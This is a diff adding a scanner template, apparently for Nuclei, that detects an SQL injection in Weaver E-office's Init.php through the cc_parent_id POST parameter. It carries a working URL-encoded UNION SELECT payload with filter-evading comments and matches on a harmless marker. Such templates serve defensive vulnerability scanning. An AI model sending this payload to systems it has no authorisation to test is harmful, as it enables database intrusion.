@@ -1,0 +1,35 @@
+id: weaver-eoffice-sql-injection
+info:
+  name: Weaver E-office Init.php SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Weaver e-office has a SQL injection vulnerability in the cc_parent_id parameter sent via POST to the /E-mobile/App/Init.php route with the ?m=getSelectList_Crm query parameter.
+  reference:
+    - https://www.weaver.com.cn/
+    - https://www.e-office.cn/
+  classification:
+    cve-id: []
+    cwe-id: [CWE-89]
+
+http:
+  - raw:
+      - |
+        POST /E-mobile/App/Init.php?m=getSelectList_Crm HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        cc_parent_id=-999+%2F%2A%2150000union%2A%2F+%2F%2A%2150000all%2A%2F+%2F%2A%2150000select%2A%2F+1%2C%28%2F%2A%2150000select%2A%2F+0x4141423339413141%29%23
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "4141423339413141"
+        part: body
+      - type: word
+        words:
+          - "CC_VALUE"
+        part: body
